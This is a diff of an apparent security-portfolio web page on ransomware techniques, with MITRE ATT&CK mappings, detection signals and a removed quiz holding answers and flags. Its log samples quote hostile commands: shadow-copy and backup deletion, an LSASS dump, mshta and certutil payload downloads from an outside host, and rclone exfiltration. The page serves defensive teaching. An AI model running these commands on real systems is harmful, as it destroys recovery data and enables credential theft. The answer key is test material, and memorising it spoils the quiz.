   .completion-content-r{position:relative;z-index:2;text-align:center;max-width:520px;padding:2rem;animation:completionReveal 0.55s cubic-bezier(0.4,0,0.2,1) forwards;}
   @keyframes completionReveal{from{opacity:0;transform:scale(0.9) translateY(24px)}to{opacity:1;transform:scale(1) translateY(0)}}
-  .badge-ring-r{width:82px;height:82px;border:2px solid var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;font-size:1.7rem;color:var(--green);box-shadow:0 0 30px rgba(57,211,83,0.3);animation:ringPulse 2s ease infinite;}
+  .badge-ring-r{width:82px;height:82px;border:2px solid #39d353;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;font-size:1.7rem;color:#39d353;animation:ringPulse 2s ease infinite;}
   @keyframes ringPulse{0%,100%{box-shadow:0 0 30px rgba(57,211,83,0.3),0 0 60px rgba(57,211,83,0.1)}50%{box-shadow:0 0 50px rgba(57,211,83,0.5),0 0 90px rgba(57,211,83,0.2)}}
-  .flag-r{font-family:var(--font-mono);font-size:0.72rem;letter-spacing:0.15em;color:var(--green);background:rgba(57,211,83,0.08);border:1px solid var(--green-dim);border-radius:3px;padding:0.35rem 0.9rem;display:inline-block;margin-bottom:1rem;}
-  .ctitle-r{font-family:var(--font-mono);font-size:1.5rem;color:var(--text-bright);letter-spacing:0.08em;margin-bottom:0.5rem;}
-  .csub-r{color:var(--text-dim);font-size:0.9rem;margin-bottom:0.75rem;line-height:1.6;}
-  .ctw-r{font-family:var(--font-mono);font-size:0.78rem;color:var(--green);margin-bottom:2rem;min-height:1.4em;}
+  .flag-r{font-family:var(--font-mono);font-size:0.72rem;letter-spacing:0.15em;color:#39d353;background:rgba(57,211,83,0.08);border:1px solid rgba(57,211,83,0.3);border-radius:3px;padding:0.35rem 0.9rem;display:inline-block;margin-bottom:1rem;}
+  .ctitle-r{font-family:var(--font-mono);font-size:1.5rem;color:#f0f6fc;letter-spacing:0.08em;margin-bottom:0.5rem;}
+  .csub-r{color:#8b949e;font-size:0.9rem;margin-bottom:0.75rem;line-height:1.6;}
+  .ctw-r{font-family:var(--font-mono);font-size:0.78rem;color:#39d353;margin-bottom:2rem;min-height:1.4em;}
   .ctw-r::after{content:'▋';animation:blink 0.8s step-end infinite;}
   @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
   .cstats-r{display:flex;gap:2rem;justify-content:center;margin-bottom:2rem;}
   .cstat-r{text-align:center;}
-  .cstat-val-r{font-family:var(--font-mono);font-size:1.4rem;color:var(--green);display:block;text-shadow:0 0 12px rgba(57,211,83,0.5);}
-  .cstat-lbl-r{font-size:0.72rem;color:var(--text-dim);letter-spacing:0.08em;text-transform:uppercase;}
-  .cbtn-r{background:transparent;border:1px solid var(--green);color:var(--green);font-family:var(--font-mono);font-size:0.8rem;padding:0.65rem 1.5rem;border-radius:4px;cursor:pointer;transition:all 0.2s;letter-spacing:0.05em;margin:0 0.4rem;}
+  .cstat-val-r{font-family:var(--font-mono);font-size:1.4rem;color:#39d353;display:block;}
+  .cstat-lbl-r{font-size:0.72rem;color:#8b949e;letter-spacing:0.08em;text-transform:uppercase;}
+  .cbtn-r{background:transparent;border:1px solid #39d353;color:#39d353;font-family:var(--font-mono);font-size:0.8rem;padding:0.65rem 1.5rem;border-radius:4px;cursor:pointer;transition:all 0.2s;margin:0 0.4rem;}
   .cbtn-r:hover{background:rgba(57,211,83,0.1);}
-  .cbtn-r.sec-r{border-color:var(--border-accent);color:var(--text-dim);}
-  .cbtn-r.sec-r:hover{border-color:var(--text-dim);color:var(--text);}
-
+  .cbtn-r.sec-r{border-color:#30363d;color:#8b949e;}
+  .cbtn-r.sec-r:hover{border-color:#8b949e;color:#c9d1d9;}
+  @media(max-width:600px){.container{padding:1.5rem 1rem;}.nav-links a{padding:0 0.6rem;font-size:0.72rem;}.detect-table{font-size:0.8rem;}.detect-table th,.detect-table td{padding:0.6rem 0.75rem;}.task-input-row-r{flex-direction:column;align-items:stretch;}.exec-btn{width:100%;text-align:center;}}
 </style>
 </head>
 <body>
-<canvas id="binary-canvas"></canvas>
+<canvas id="matrix-rain" aria-hidden="true"></canvas>
+
+<div id="completion-overlay-r">
+  <canvas id="completion-canvas-r"></canvas>
+  <div class="completion-content-r">
+    <div class="badge-ring-r">✔</div>
+    <div class="flag-r" id="ra-flag">TIER COMPLETE</div>
+    <div class="ctitle-r" id="ra-ctitle">TIER CLEARED</div>
+    <div class="csub-r" id="ra-csub">All tasks validated.</div>
+    <div class="ctw-r" id="ra-ctw"></div>
+    <div class="cstats-r">
+      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-tasks">4/16</span><span class="cstat-lbl-r">Total Tasks</span></div>
+      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-score">100%</span><span class="cstat-lbl-r">Score</span></div>
+      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-time">—</span><span class="cstat-lbl-r">Time</span></div>
+    </div>
+    <div>
+      <button class="cbtn-r sec-r" id="ra-retry-btn" onclick="raRetry()">↺ Retry Tier</button>
+      <button class="cbtn-r" id="ra-next-btn" onclick="raAdvance()">→ Next Tier</button>
+    </div>
+  </div>
+</div>
 
 <nav>
-  <div class="nav-brand" data-glitch>[ DOMENICO :: OPSEC ]</div>
+  <a class="nav-brand" href="index.html" data-nav data-glitch>[ DOMENICO :: OPSEC ]</a>
   <ul class="nav-links">
-    <li><a href="index.html">Home</a></li>
-    <li><a href="projects.html" class="active">Projects</a></li>
-    <li><a href="about.html">About</a></li>
+    <li><a href="index.html" data-nav>Home</a></li>
+    <li><a href="projects.html" class="active" data-nav>Projects</a></li>
+    <li><a href="threat-profiles.html" data-nav>Intel Feed</a></li>
+    <li><a href="osint-tools.html" data-nav>OSINT</a></li>
+    <li><a href="about.html" data-nav>About</a></li>
+    <button class="theme-toggle-btn" data-theme-toggle aria-label="Switch to dark mode">☽ DARK</button>
   </ul>
 </nav>
 
 <div class="container">
-
   <div class="page-header">
-    <div class="breadcrumb">
-      <a href="projects.html">Projects</a>
-      <span>/</span>
-      Ransomware Technique Analysis
-    </div>
+    <div class="breadcrumb"><a href="projects.html">Projects</a><span>/</span>Ransomware Technique Analysis</div>
     <h1 class="page-title">Ransomware Technique Analysis</h1>
     <p class="page-subtitle">MITRE ATT&amp;CK mapping · Purple team correlation · Detection engineering</p>
   </div>
 
-  <!-- OVERVIEW -->
   <div class="section">
     <div class="section-title">Overview</div>
-    <div class="card">
-      This analysis examines real-world ransomware campaigns through the lens of MITRE ATT&amp;CK,
-      mapping each phase of the attack chain and highlighting observable telemetry for purple team
-      correlation. Each stage documents attacker tradecraft alongside SIEM-ready detection signals
-      for defenders.
-    </div>
-    <div class="binary-strip">
-      01010101011010100101010101010101 10101001101010101001010101010101 01101010101011010100101010101010 11010101010110101010101010010101
-    </div>
+    <div class="card">This analysis examines real-world ransomware campaigns through the lens of MITRE ATT&amp;CK, mapping each phase of the attack chain and highlighting observable telemetry for purple team correlation. Each stage documents attacker tradecraft alongside SIEM-ready detection signals for defenders.</div>
+    <div class="binary-strip">01010101011010100101010101010101 10101001101010101001010101010101 01101010101011010100101010101010 11010101010110101010101010010101</div>
   </div>
 
-  <!-- INFECTION CHAIN -->
   <div class="section">
     <div class="section-title">Infection Chain – Click Phase to Expand</div>
     <div class="chain">
-
       <div class="chain-phase" onclick="togglePhase(this)">
-        <div class="chain-phase-header">
-          <span class="phase-badge badge-initial">Initial Access</span>
-          <span class="phase-title">Phishing &amp; Exposed RDP</span>
-          <span class="phase-mitre">T1566 · T1078</span>
-          <span class="phase-chevron">›</span>
-        </div>
+        <div class="chain-phase-header"><span class="phase-badge badge-initial">Initial Access</span><span class="phase-title">Phishing &amp; Exposed RDP</span><span class="phase-mitre">T1566 · T1078</span><span class="phase-chevron">›</span></div>
         <div class="chain-phase-body">
-          <div class="phase-detail">
-            Phishing emails deliver macro-enabled Office attachments or compressed executables.
-            Alternatively, attackers exploit internet-facing RDP endpoints with weak or default credentials,
-            conducting automated brute-force campaigns prior to successful authentication.
-          </div>
+          <div class="phase-detail">Phishing emails deliver macro-enabled Office attachments or compressed executables. Alternatively, attackers exploit internet-facing RDP endpoints with weak or default credentials, conducting automated brute-force campaigns prior to successful authentication.</div>
           <div class="telemetry-label">Telemetry Signals</div>
           <div class="telemetry-block">Event ID: 4625  — Failed Logon (repeated, same source IP)
 Event ID: 4624  — Successful Logon | LogonType: 10 (RemoteInteractive)
 Source IP:      External — flag for geo-anomaly
 Threshold:      >20 failures in 2 min → brute-force indicator</div>
-          <br>
-          <a href="adversary-lab.html" class="page-nav-link">Go to Emulation Lab</a>
+          <br><a href="adversary-lab.html" class="page-nav-link" data-nav>Go to Emulation Lab</a>
         </div>
       </div>
-
       <div class="chain-phase" onclick="togglePhase(this)">
-        <div class="chain-phase-header">
-          <span class="phase-badge badge-exec">Execution</span>
-          <span class="phase-title">Malicious Binary &amp; Persistence</span>
-          <span class="phase-mitre">T1059 · T1053 · T1547</span>
-          <span class="phase-chevron">›</span>
-        </div>
+        <div class="chain-phase-header"><span class="phase-badge badge-exec">Execution</span><span class="phase-title">Malicious Binary &amp; Persistence</span><span class="phase-mitre">T1059 · T1053 · T1547</span><span class="phase-chevron">›</span></div>
         <div class="chain-phase-body">
-          <div class="phase-detail">
-            Malicious binaries are executed via PowerShell or cmd.exe. Persistence is established through
-            registry run keys, scheduled tasks, or new service installation. Remote services are leveraged
-            for staging payloads across the environment.
-          </div>
+          <div class="phase-detail">Malicious binaries are executed via PowerShell or cmd.exe. Persistence is established through registry run keys, scheduled tasks, or new service installation. Remote services are leveraged for staging payloads across the environment.</div>
           <div class="telemetry-label">Telemetry Signals</div>
           <div class="telemetry-block">Event ID: 4688  — Process Creation (PowerShell with encoded args)
 Event ID: 7045  — New Service Installed
@@ -525,20 +236,10 @@ Key:            HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 Sched Task:     schtasks /create — monitor for unusual names/paths</div>
         </div>
       </div>
-
       <div class="chain-phase" onclick="togglePhase(this)">
-        <div class="chain-phase-header">
-          <span class="phase-badge badge-cred">Credential Access</span>
-          <span class="phase-title">LSASS Dump &amp; Credential Harvesting</span>
-          <span class="phase-mitre">T1003.001 · T1552</span>
-          <span class="phase-chevron">›</span>
-        </div>
+        <div class="chain-phase-header"><span class="phase-badge badge-cred">Credential Access</span><span class="phase-title">LSASS Dump &amp; Credential Harvesting</span><span class="phase-mitre">T1003.001 · T1552</span><span class="phase-chevron">›</span></div>
         <div class="chain-phase-body">
-          <div class="phase-detail">
-            Attackers target LSASS memory to extract plaintext credentials and NTLM hashes.
-            Weak password policies and credential reuse across systems accelerate lateral movement.
-            Harvested credentials enable pass-the-hash and pass-the-ticket attacks.
-          </div>
+          <div class="phase-detail">Attackers target LSASS memory to extract plaintext credentials and NTLM hashes. Weak password policies and credential reuse across systems accelerate lateral movement. Harvested credentials enable pass-the-hash and pass-the-ticket attacks.</div>
           <div class="telemetry-label">Telemetry Signals</div>
           <div class="telemetry-block">Event ID: 4656  — Handle to LSASS requested (GrantedAccess: 0x1010)
 Event ID: 4688  — Process Created: mimikatz.exe / procdump.exe
@@ -546,20 +247,10 @@ WinDefend:      LSASS memory read blocked (if protected)
 Alert:          Unexpected access to lsass.exe from non-system process</div>
         </div>
       </div>
-
       <div class="chain-phase" onclick="togglePhase(this)">
-        <div class="chain-phase-header">
-          <span class="phase-badge badge-lateral">Lateral Movement</span>
-          <span class="phase-title">SMB Pivoting &amp; Remote Execution</span>
-          <span class="phase-mitre">T1021.002 · T1021.006 · T1570</span>
-          <span class="phase-chevron">›</span>
-        </div>
+        <div class="chain-phase-header"><span class="phase-badge badge-lateral">Lateral Movement</span><span class="phase-title">SMB Pivoting &amp; Remote Execution</span><span class="phase-mitre">T1021.002 · T1021.006 · T1570</span><span class="phase-chevron">›</span></div>
         <div class="chain-phase-body">
-          <div class="phase-detail">
-            Using harvested credentials, attackers move laterally via SMB administrative shares,
-            remote PowerShell sessions (WinRM), or PsExec-style service creation on target hosts.
-            Payload staging often occurs through ADMIN$ or C$ shares.
-          </div>
+          <div class="phase-detail">Using harvested credentials, attackers move laterally via SMB administrative shares, remote PowerShell sessions (WinRM), or PsExec-style service creation on target hosts. Payload staging often occurs through ADMIN$ or C$ shares.</div>
           <div class="telemetry-label">Telemetry Signals</div>
           <div class="telemetry-block">Event ID: 4624  — Logon Type 3 (Network) to internal hosts
 Event ID: 5140  — Network Share Object Accessed (ADMIN$, C$)
@@ -567,20 +258,10 @@ Event ID: 7045  — New service on remote host (lateral exec)
 Alert:          Workstation → Workstation SMB (unusual in most orgs)</div>
         </div>
       </div>
-
       <div class="chain-phase" onclick="togglePhase(this)">
-        <div class="chain-phase-header">
-          <span class="phase-badge badge-impact">Impact</span>
-          <span class="phase-title">File Encryption &amp; Shadow Copy Deletion</span>
-          <span class="phase-mitre">T1486 · T1490</span>
-          <span class="phase-chevron">›</span>
-        </div>
+        <div class="chain-phase-header"><span class="phase-badge badge-impact">Impact</span><span class="phase-title">File Encryption &amp; Shadow Copy Deletion</span><span class="phase-mitre">T1486 · T1490</span><span class="phase-chevron">›</span></div>
         <div class="chain-phase-body">
-          <div class="phase-detail">
-            The encryptor is deployed and executed across all reachable hosts. Before or during
-            encryption, shadow copies and backup catalogs are deleted to prevent recovery.
-            Ransom notes are dropped in every encrypted directory.
-          </div>
+          <div class="phase-detail">The encryptor is deployed and executed across all reachable hosts. Before or during encryption, shadow copies and backup catalogs are deleted to prevent recovery. Ransom notes are dropped in every encrypted directory.</div>
           <div class="telemetry-label">Telemetry Signals</div>
           <div class="telemetry-block">Command:  vssadmin delete shadows /all /quiet
 Command:  wbadmin delete catalog -quiet
@@ -589,83 +270,36 @@ Alert:    Rapid file rename events (extension change) across multiple dirs
 Alert:    Volume Shadow Copy deletion by non-system process</div>
         </div>
       </div>
-
     </div>
   </div>
 
-  <!-- DETECTION TABLE -->
   <div class="section">
     <div class="section-title">Observed Behavior &amp; Detection Signals</div>
     <table class="detect-table">
-      <thead>
-        <tr>
-          <th>Event ID</th>
-          <th>Behavior</th>
-          <th>Detection Context</th>
-        </tr>
-      </thead>
+      <thead><tr><th>Event ID</th><th>Behavior</th><th>Detection Context</th></tr></thead>
       <tbody>
-        <tr>
-          <td>4625 → 4624</td>
-          <td>Brute-force then successful RDP logon</td>
-          <td>Repeated failures from same IP followed by Type 10 success</td>
-        </tr>
-        <tr>
-          <td>4688</td>
-          <td>Suspicious process creation</td>
-          <td>Encoded PowerShell args, mimikatz, procdump spawned</td>
-        </tr>
-        <tr>
-          <td>4656</td>
-          <td>LSASS handle request</td>
-          <td>GrantedAccess 0x1010 from non-system process</td>
-        </tr>
-        <tr>
-          <td>5140</td>
-          <td>Admin share access</td>
-          <td>ADMIN$ / C$ accessed from workstation — lateral pivot</td>
-        </tr>
-        <tr>
-          <td>7045</td>
-          <td>New service installed</td>
-          <td>Unexpected binary path, random service name</td>
-        </tr>
-        <tr>
-          <td>VSS event</td>
-          <td>Shadow copy deletion</td>
-          <td>vssadmin / wmic triggered by non-backup process</td>
-        </tr>
+        <tr><td>4625 → 4624</td><td>Brute-force then successful RDP logon</td><td>Repeated failures from same IP followed by Type 10 success</td></tr>
+        <tr><td>4688</td><td>Suspicious process creation</td><td>Encoded PowerShell args, mimikatz, procdump spawned</td></tr>
+        <tr><td>4656</td><td>LSASS handle request</td><td>GrantedAccess 0x1010 from non-system process</td></tr>
+        <tr><td>5140</td><td>Admin share access</td><td>ADMIN$ / C$ accessed from workstation — lateral pivot</td></tr>
+        <tr><td>7045</td><td>New service installed</td><td>Unexpected binary path, random service name</td></tr>
+        <tr><td>VSS event</td><td>Shadow copy deletion</td><td>vssadmin / wmic triggered by non-backup process</td></tr>
       </tbody>
     </table>
   </div>
 
-  <!-- WEAK PASSWORD HYGIENE -->
   <div class="section">
     <div class="section-title">Weak Password Hygiene – Attack Enablers</div>
     <div class="weakness-list">
-      <div class="weakness-item">
-        <span class="weakness-icon">[!]</span>
-        <span>Passwords under 8 characters or default system/vendor passwords left unchanged.</span>
-      </div>
-      <div class="weakness-item">
-        <span class="weakness-icon">[!]</span>
-        <span>Credentials reused across multiple systems and services, enabling lateral movement post-dump.</span>
-      </div>
-      <div class="weakness-item">
-        <span class="weakness-icon">[!]</span>
-        <span>Passwords stored in plaintext within scripts, config files, or Group Policy Preferences.</span>
-      </div>
-      <div class="weakness-item">
-        <span class="weakness-icon">[!]</span>
-        <span>No enforced password complexity policy or multi-factor authentication on critical accounts.</span>
-      </div>
+      <div class="weakness-item"><span class="weakness-icon">[!]</span><span>Passwords under 8 characters or default system/vendor passwords left unchanged.</span></div>
+      <div class="weakness-item"><span class="weakness-icon">[!]</span><span>Credentials reused across multiple systems and services, enabling lateral movement post-dump.</span></div>
+      <div class="weakness-item"><span class="weakness-icon">[!]</span><span>Passwords stored in plaintext within scripts, config files, or Group Policy Preferences.</span></div>
+      <div class="weakness-item"><span class="weakness-icon">[!]</span><span>No enforced password complexity policy or multi-factor authentication on critical accounts.</span></div>
     </div>
   </div>
 
-  <!-- RANSOMWARE ANALYSIS ROOM -->
   <div class="section">
     <div class="section-title">Analyst Challenge Room – Ransomware Technique Quiz</div>
-
     <div class="room-terminal" id="ra-room-terminal">
       <div class="terminal-bar">
         <div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div>
@@ -691,301 +325,28 @@ Alert:    Volume Shadow Copy deletion by non-system process</div>
       <div class="task-list" id="ra-task-list"></div>
     </div>
   </div>
-
-</div>
-
-<!-- COMPLETION OVERLAY -->
-<div id="completion-overlay-r">
-  <canvas id="completion-canvas-r"></canvas>
-  <div class="completion-content-r">
-    <div class="badge-ring-r">✔</div>
-    <div class="flag-r" id="ra-flag">TIER COMPLETE</div>
-    <div class="ctitle-r" id="ra-ctitle">TIER CLEARED</div>
-    <div class="csub-r" id="ra-csub">All tasks validated.</div>
-    <div class="ctw-r" id="ra-ctw"></div>
-    <div class="cstats-r">
-      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-tasks">4/16</span><span class="cstat-lbl-r">Total Tasks</span></div>
-      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-score">100%</span><span class="cstat-lbl-r">Score</span></div>
-      <div class="cstat-r"><span class="cstat-val-r" id="ra-stat-time">—</span><span class="cstat-lbl-r">Time</span></div>
-    </div>
-    <div>
-      <button class="cbtn-r sec-r" id="ra-retry-btn" onclick="raRetry()">↺ Retry Tier</button>
-      <button class="cbtn-r" id="ra-next-btn" onclick="raAdvance()">→ Next Tier</button>
-    </div>
-  </div>
 </div>
 
 <script>
 function togglePhase(el){el.classList.toggle('open');}
-
-const RA_TIERS=[
-  { id:0,label:'NOVICE',tierClass:'tier-novice',accent:'#39d353',
-    terminalLabel:'ransomware-analysis.sh — tier 1: novice',
-    roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — NOVICE',
-    roomDesc:'Identify ransomware techniques from the attack chain. Answer correctly to unlock the next task.',
-    ctitle:'NOVICE TIER CLEARED',csub:'Foundational ransomware technique knowledge validated. Advancing to Intermediate.',
-    flag:'THM{ransomware_novice_analyst}',nextLabel:'INTERMEDIATE',
-    tasks:[
-      {title:'Initial Access Method',
-       code:'Telemetry:\n  Event ID: 4625 x156 — admin account, src: 91.121.44.7\n  Event ID: 4624 — Logon Type 10, src: 91.121.44.7\n  Time between first failure and success: 00:04:22',
-       prompt:'What initial access technique do repeated 4625 failures followed by a 4624 Type 10 success indicate?',
-       placeholder:'Enter technique name...',answers:['brute force','rdp brute force','bruteforce','brute-force'],hint:null},
-      {title:'Persistence Mechanism',
-       code:'Event ID: 7045 — New Service Installed\nService Name: WindowsUpdateSvc32\nBinary Path: C:\\Windows\\Temp\\svch0st.exe\nStart Type: Auto',
-       prompt:'What MITRE ATT&CK technique ID describes persistence via installing a malicious Windows service?',
-       placeholder:'Enter technique ID (T1543.xxx)...',answers:['t1543.003','1543.003'],hint:null},
-      {title:'Credential Dumping Tool',
-       code:'Event ID: 4688\nProcess: cmd.exe\nCommandLine: procdump.exe -ma lsass.exe lsass.dmp\nEvent ID: 4656 — Handle to lsass.exe\nGrantedAccess: 0x1010',
-       prompt:'What tool is being used to dump LSASS memory in this telemetry?',
-       placeholder:'Enter tool name...',answers:['procdump','procdump.exe','sysinternals procdump'],hint:null},
-      {title:'Impact — File Encryption Indicator',
-       code:'Alert: Rapid file rename events\nSource: svchost32.exe\nPattern: *.docx → *.docx.locked (x4400 in 00:01:12)\nFile: READ_ME_RANSOM.txt dropped in every directory',
-       prompt:'What MITRE ATT&CK technique ID describes ransomware encrypting files for impact?',
-       placeholder:'Enter technique ID (T1xxx)...',answers:['t1486','1486'],hint:null}
-    ]
-  },
-  { id:1,label:'INTERMEDIATE',tierClass:'tier-intermediate',accent:'#58a6ff',
-    terminalLabel:'ransomware-analysis.sh — tier 2: intermediate',
-    roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — INTERMEDIATE',
-    roomDesc:'Deeper MITRE mapping and multi-stage attack chain reasoning. Hints available.',
-    ctitle:'INTERMEDIATE TIER CLEARED',csub:'Attack chain mapping and sub-technique identification validated.',
-    flag:'THM{ransomware_intermediate_analyst}',nextLabel:'HARD',
-    tasks:[
-      {title:'Execution via Macro',
-       code:'Process Tree:\n  winword.exe\n  └─ cmd.exe /c powershell -WindowStyle Hidden -enc [base64]\n     └─ mshta.exe http://185.220.101.45/payload.hta\n\nEvent ID: 4688 — all processes above\nNo binary dropped — fileless second stage',
-       prompt:'What MITRE ATT&CK sub-technique describes Office macros spawning child processes for execution?',
-       placeholder:'Enter sub-technique ID (T1566.xxx)...',answers:['t1566.001','1566.001'],
-       hint:'T1566 covers Phishing. The sub-technique for malicious attachments delivered via email is .001.'},
-      {title:'Lateral Movement via WMI',
-       code:'Event ID: 4688\nProcess: wmiprvse.exe\nCommandLine: wmic /node:192.168.1.104 process call create "cmd /c C:\\Windows\\Temp\\payload.exe"\nAuth: DOMAIN\\svc_backup (harvested creds)\nDest: 192.168.1.104 (File Server)',
-       prompt:'What MITRE ATT&CK sub-technique describes remote process creation via WMI for lateral movement?',
-       placeholder:'Enter sub-technique ID (T1021.xxx)...',answers:['t1021.006','1021.006'],
-       hint:'T1021 covers Remote Services. WMI-based remote execution is sub-technique .006.'},
-      {title:'Defence Evasion — Timestomping',
-       code:'Forensic Analysis:\n  File: C:\\Windows\\Temp\\svch0st.exe\n  Created (NTFS $MFT): 2024-03-14 09:12:44\n  Created (displayed): 2019-01-01 00:00:00\n  Modified (displayed): 2019-01-01 00:00:00\n  Discrepancy: MACE timestamps altered post-drop',
-       prompt:'What MITRE ATT&CK sub-technique describes altering file timestamps to evade detection?',
-       placeholder:'Enter sub-technique ID (T1070.xxx)...',answers:['t1070.006','1070.006'],
-       hint:'T1070 covers Indicator Removal. Modifying MACE timestamps to blend in with legitimate files is sub-technique .006.'},
-      {title:'Exfiltration Tool Identification',
-       code:'Event ID: 4688\nProcess: rclone.exe\nCommandLine: rclone copy C:\\staged\\data.7z remote:mega-exfil --transfers 8\nOutbound: HTTPS to api.mega.nz\nSize: 12.4GB transferred in 00:08:33',
-       prompt:'What cloud storage service is being abused as the exfiltration destination in this log?',
-       placeholder:'Enter service name...',answers:['mega','mega.nz','mega cloud'],
-       hint:'Look at the outbound DNS destination in the command line — it names the cloud platform explicitly.'}
-    ]
-  },
-  { id:2,label:'HARD',tierClass:'tier-hard',accent:'#e3b341',
-    terminalLabel:'ransomware-analysis.sh — tier 3: hard',
-    roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — HARD',
-    roomDesc:'Full campaign reconstruction and group attribution from raw evidence. Think carefully.',
-    ctitle:'HARD TIER CLEARED',csub:'Campaign reconstruction and attribution validated. Expert tier unlocked.',
-    flag:'THM{ransomware_hard_attribution}',nextLabel:'EXPERT',
-    tasks:[
-      {title:'RaaS Group Attribution',
-       code:'Campaign IOCs:\n  • Initial access: VPN credential stuffing\n  • Dropper: DarkSide loader (custom packer)\n  • C2: Cobalt Strike — hardcoded domains\n  • Victim: US fuel pipeline operator\n  • Ransom demand: $4.4M in Bitcoin\n  • Double extortion: Yes — data published on leak site\n  • Operator model: Ransomware-as-a-Service',
-       prompt:'Which ransomware group conducted the 2021 US fuel pipeline attack matching these IOCs?',
-       placeholder:'Enter group name...',answers:['darkside','dark side','darkside ransomware'],
-       hint:'This group targeted critical infrastructure in 2021 and caused a major US fuel supply disruption — their name matches their loader tool.'},
-      {title:'Encryption Algorithm Identification',
-       code:'Binary Analysis — encryptor.exe:\n  Strings found:\n    "AES-256-CBC"\n    "RSA-2048"\n  Behaviour:\n    - Generates random AES key per file\n    - AES key encrypted with embedded RSA public key\n    - Victim must pay to receive RSA private key\n  Extension appended: .encrypted',
-       prompt:'What hybrid encryption scheme does this ransomware use? (format: algo1 + algo2)',
-       placeholder:'e.g. AES + RSA...',answers:['aes + rsa','aes-256 + rsa-2048','aes256 + rsa2048','rsa + aes','aes rsa'],
-       hint:'The encryptor generates a symmetric key per file, then protects that key with an asymmetric algorithm. Name both algorithms used.'},
-      {title:'MITRE ATT&CK Sub-Technique — Backup Destruction',
-       code:'Commands observed on Domain Controller:\n  wbadmin delete catalog -quiet\n  bcdedit /set {default} bootstatuspolicy ignoreallfailures\n  bcdedit /set {default} recoveryenabled no\n  wmic shadowcopy delete\n  vssadmin delete shadows /all /quiet',
-       prompt:'What MITRE ATT&CK sub-technique ID covers inhibiting system recovery by deleting backups and shadow copies?',
-       placeholder:'Enter sub-technique ID (T1490.xxx or T1490)...',answers:['t1490','1490'],
-       hint:'This technique has no sub-techniques — it is T1490 at the top level. It covers all actions that prevent system recovery.'},
-      {title:'Network Propagation Method',
-       code:'Event ID: 4776 — NTLM Auth on DC\nSource: WS-01 (192.168.1.101)\nTarget Share: \\\\DC-01\\SYSVOL\n\nEvent ID: 4688 — net.exe on WS-01\nCommandLine: net view /domain\n\nEvent ID: 4689 — wmic.exe\nCommandLine: wmic /node:@targets.txt process call create "certutil -urlcache -f http://c2/enc.exe enc.exe && enc.exe"\n\nTargets.txt: 47 hosts listed',
-       prompt:'What propagation technique describes using WMI to simultaneously deploy ransomware across a pre-enumerated host list?',
-       placeholder:'Enter technique or description...',answers:['worm','lateral movement via wmi','wmi lateral movement','t1047','automated lateral movement','mass deployment'],
-       hint:'The attacker used WMI to push to 47 hosts in a single command. This is automated, mass lateral movement rather than manual host-to-host pivoting.'}
-    ]
-  },
-  { id:3,label:'EXPERT',tierClass:'tier-expert',accent:'#f85149',
-    terminalLabel:'ransomware-analysis.sh — tier 4: expert [FINAL]',
-    roomName:'[ ROOM ] RANSOMWARE TECHNIQUE ANALYSIS — EXPERT',
-    roomDesc:'Elite-level campaign analysis. Distinguish subtle IOC differences. No margin for error.',
-    ctitle:'ELITE RANSOMWARE ANALYST',csub:'All four tiers cleared. Expert-level ransomware analysis proficiency confirmed.',
-    flag:'THM{elite_ransomware_analyst_certified}',nextLabel:null,
-    tasks:[
-      {title:'Distinguish Similar Encryptors',
-       code:'Sample A:\n  Extension: .hive\n  Note: "Your network has been hacked and encrypted"\n  Payment: Tor .onion site\n  RaaS: Yes\n\nSample B:\n  Extension: .rhysida\n  Note: "We are Rhysida"\n  Payment: Dedicated victim portal\n  Target sector: Healthcare, Education\n  RaaS: Yes\n\nSample C:\n  Extension: .black\n  Note: Restores-Your-Files.txt\n  C2: Cobalt Strike + custom loader\n  Affiliate program: Yes, 80/20 split',
-       prompt:'Which sample matches BlackCat/ALPHV ransomware based on its affiliate split model and extension?',
-       placeholder:'Enter sample letter (A, B or C)...',answers:['c','sample c'],
-       hint:'BlackCat/ALPHV is known for its affiliate-friendly 80/20 revenue split and the .black extension. Match those specific IOCs.'},
-      {title:'Fileless Ransomware Stage',
-       code:'Memory Forensics — memdump analysis:\n  Process: powershell.exe (PID 4812)\n  Injected region: RWX — 0x1f4000 bytes\n  Strings extracted from injected region:\n    "AES_256_CBC_encrypt"\n    "vssadmin delete shadows"\n    "README_DECRYPT.txt"\n  No binary found on disk\n  No registry persistence\n  Executed entirely in memory',
-       prompt:'What MITRE ATT&CK technique ID describes executing malicious code entirely in memory without writing to disk?',
-       placeholder:'Enter technique ID (T1xxx)...',answers:['t1620','1620','t1055','1055'],
-       hint:'This is fileless malware running in a reflectively injected memory region. Look at T1620 (Reflective Code Loading) or T1055 (Process Injection).'},
-      {title:'Double Extortion Timeline',
-       code:'Day 1-3:   Initial access, lateral movement, domain compromise\nDay 4:     Rclone exfiltrates 84GB to attacker-controlled S3 bucket\nDay 5:     Encryptor deployed — 312 hosts encrypted\nDay 6:     Ransom note discovered — $8M demand\nDay 9:     Victim refuses to pay\nDay 11:    Partial data dump published on leak site (23GB)\nDay 14:    Full data published — 84GB released publicly',
-       prompt:'What is the name of the two-stage extortion model where both encryption AND data theft are used as leverage?',
-       placeholder:'Enter extortion model name...',answers:['double extortion','double-extortion','dual extortion'],
-       hint:'This model emerged around 2019 with Maze ransomware. It involves threatening to publish stolen data even if ransom is paid.'},
-      {title:'Full Campaign MITRE Mapping',
-       code:'Campaign summary:\n  1. VPN brute force → T1110.003\n  2. PowerShell execution → T1059.001\n  3. LSASS dump via procdump → T1003.001\n  4. Lateral movement via PsExec → T1569.002\n  5. Rclone exfiltration → T1567.002\n  6. File encryption → T1486\n  7. Shadow copy deletion → T1490\n\nQuestion relates to step 5.',
-       prompt:'What MITRE ATT&CK sub-technique ID does T1567.002 represent? (describe the technique in words)',
-       placeholder:'Enter description...',answers:['exfiltration to cloud storage','exfil to cloud storage','data exfiltration to cloud','cloud storage exfiltration','exfiltration to cloud'],
